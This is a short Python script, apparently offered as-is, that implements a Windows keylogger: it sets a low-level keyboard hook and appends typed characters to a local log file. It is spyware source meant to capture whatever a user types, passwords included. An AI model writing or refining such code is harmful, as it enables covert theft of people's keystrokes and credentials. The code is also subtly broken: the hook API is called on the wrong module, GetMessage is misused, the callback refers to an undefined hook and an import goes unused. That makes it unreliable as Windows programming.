import pyautogui
import time
import win32api
import win32con
def main():
    # Create a hook to monitor keystrokes
    hook = win32api.SetWindowsHookEx(win32con.WH_KEYBOARD_LL, keylogger, 0)
    # Start a loop to listen for keystrokes
    while True:
        # Check if there is a keystroke event
        event = win32api.GetMessage()
        # If there is a keystroke event, log it
        if event.message == win32con.WM_KEYDOWN:
            key = event.wParam
            log(key)
        # Sleep for a short amount of time
        time.sleep(0.1)
def keylogger(nCode, wParam, lParam):
    # Check if the keystroke is a printable character
    if wParam > 32 and wParam < 127:
        log(wParam)
    return win32api.CallNextHookEx(hook, nCode, wParam, lParam)
def log(key):
    # Write the keystroke to a file
    with open("log.txt", "a") as f:
        f.write(chr(key))
if __name__ == "__main__":
    main()